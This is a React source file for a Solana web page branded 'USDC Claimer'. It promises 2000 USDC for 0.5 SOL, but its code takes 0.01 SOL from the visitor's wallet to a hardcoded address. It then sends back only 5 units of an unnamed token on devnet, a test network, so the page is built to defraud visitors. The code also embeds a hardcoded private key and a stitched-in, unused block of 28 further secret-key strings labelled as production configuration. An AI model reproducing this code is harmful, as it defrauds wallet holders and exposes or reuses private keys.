/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "2483PdfnUvhhax1hctm7U3LaJrDRYacDsnhJJEWDRhSnWnrhDGu3f9PyYYqonEQgkqBcWZJD6voiW8g9o7qSPado"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "2QtdGv9o7d2SkHujjzuE5JhSQUcmh9UXBhbvXL5qip51MRY4mNy6pGFp4bBZX2axMnvb7nXqxw3822JwaxxLSfCR",
  "key1": "5bfGou2mjsyYrYA8qpeUxmXTcj2typTbuJNJSUYeTJM25qEecJrWCd1MZDdyyBvNNeQ3nraRCXmaccqLt2BPEs9Z",
  "key2": "4otWPXHMEjVaxvVxS2WavUewNNtjZCHTrF4qku7TFK1r15dPNYRVrtD1zZVSRtpzoa2uuqfBtERi8acLpYeVMNF9",
  "key3": "LLu4exPFhG3jZPyYEVkNjsKGefjyYdbBQuT38aNmDH7Vkab1ac7sUTdcnWWLDDzQD4d43PpxC3bd8hFVCkDA96V",
  "key4": "3bGUHDnqEzbdJuPUPRAm5QEr7qtQQWmxnLLWjUzSKMJotgH71N6p1NWNoQyoF2NDhFBgR73Caf9ugWp8mJTK1d3D",
  "key5": "5mFoqUaGhEDRhasS3tt916MUE9HUR4g3JwPDZF4j7zVPRSH4FHgg41K15NnF5zFfhYQnxLCv6X6kF3LVAeHK2DGV",
  "key6": "2Wtyhod9yqexKJTveqp4SH9FXPfahrByjmPEjMcXAFqjmj4QSfgaC3C884mPDZ8mPww3N8uZXVpVEWFSSohsqYUg",
  "key7": "4niNpvfNd7c9KP6PJW2iSkKDijSedrMS5gzoEpe69bWrsRxThA1V1mQL7zQ93MTQt4Nbbq83nB41JgtgbTNgfLJH",
  "key8": "2GMp8k2tqDsr7Xmoihrp8bBVRDK2buWYjtxz42yVB4JJDPYah674siFjFqJYWWi7MP3jpBsWxxMbgtyWXPNA3fAV",
  "key9": "52Hh2ncU1wpSjRH7hUTxYaxmAHQFvMYYVYPPCd2HHF6Pyj2yMo1y5gQS3d4mzpWurBVG8VujnZn9V2xm8hrtbt2X",
  "key10": "5sRnD6qSXTZBQNBFpLsn8mbGdYmkqEijjo97htcvhGtn42qpAdG8hUxpumeDBZ51zY9Csn9Xs93qhScEhjk7Xv8X",
  "key11": "4CpACf6jfgfQgKbfWMap4VdkK3LZTqZJh5r7N83P51jFLnRsr5kqUSGRQiWkkydZWv1mq7S1K2FxhTAgbaAxZ8Xi",
  "key12": "48LbkDU6oHu5mzcH4sSnAhnr8NUTPjRieGZdVUPJ7n72qw7NhnDow4QjQaEQGQNz5y8NuLPeqsArb61FkSEtF2L5",
  "key13": "4iWQvXFRbo8zhM4JLaNkTGFgH5xxbsdK6nszEJNUcHqyjE5aXDPizxN9ZSvSEviKawf1PSyshtgVPA5s2iJX3YVZ",
  "key14": "4BxcMbwNBNWPegioGZifP9ZAmW3ZRc67HRsJJinHLwH2VMD3CvHoZh4Xq2exurdcUoqzRogNXWSex6yPmGR7uy9P",
  "key15": "3L7S5jy7sKmswz56f9wwV3NXB1WZeFHfed6aRAQaMKafAMJdyuvCKpFFh5WojKXPJ4HHAUF8MVcZb98XmN8r9c25",
  "key16": "35ZAPdDG1LaqA5fL7s5SK2ac5hVW4YoyK7bUcjXgRZ912RCHVqYVaXFUUwucx8GgkXtaPspBYsHdTckMvKiX3hLZ",
  "key17": "3T3NzKBCyejQeVqeNqk4swcDvskdkcjnFXaHxMHXs9VDjUkbdJx8wHBbznb9eCnK5P4pujvDXEzg4ZtPeckAgPQE",
  "key18": "4yGCLygeaZj4p3SSNHEXrkUPNTKA4k57MJxCqRhPUJLsCqKPWzvdkdxYjCiH6yh4W3E9JC26xHVn3K72kEiLtXCd",
  "key19": "3GhLhxyycN8aAwidu4G3tYodbydFu4WJint93PnS3Zh32cuYda8X3r2kkyJcMWbGqmzrYjvJ8zXRDfZxzHHiSYhK",
  "key20": "5z25rTSVaLEa3AuDy9P6b1CeSixUUMhxJp5AhivRbawRtapcSvaccvb4yEUUmbczHQaGPKEC8LJiNHJf9mbwLGjj",
  "key21": "3Q6zrRH4LLAVmNAHEzBdtxbp83fkqHv4ofvPHXBMt9nyKf2WCRVKTHa2TnAmoxZq86fb6BGqWNntysrpNamwXqM1",
  "key22": "3NcuohdaySvy5WHJojRb1JHYhXCLqTUogsD53bZmZiZmX8WSz2d8Xoz7gtwxwuhD5A7iWFSgBPLMpbEnjMpeZ5cZ",
  "key23": "4mPozWyk6wZcd9tgjwctAMCqcKQ7ytzgDGTD3Uejouus2VG7rBc3aKtVFnPdnEuWXe2GRwxLAQcqan5gDqJJ1VXE",
  "key24": "5yz9sUxzHrP5SjZiKgJsRogY7F8FFu1he38GAvKj6HjYkbW1nr1Fq16iEqnnycCMVV4WLP9Vdr66u9RJD4q9pCLy",
  "key25": "ae3scN1c7F6Bgn5aLiRT9NimkuBEPdboDigRA9ZWxr7tJVh55BEHhxXYBDNnCECmht4dZTwYod4WTJ6tRTLpt8M",
  "key26": "39YvvCjSB8Yovs6Li7kXz9RMDXCCTYg1UpbA39EQ9jaxdZpGmCqkNRRn7wU8sL3XUoT4TNh3bvQoaWbrthhKNREp",
  "key27": "4cuBGE75R2Pvs7P6e19CnKqNdfE8HQmrjLh7TVHj2fccjKKQSVCdi6ofq5mHekb7gjJKYH7EGLDUvnzRWkANcFXD"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
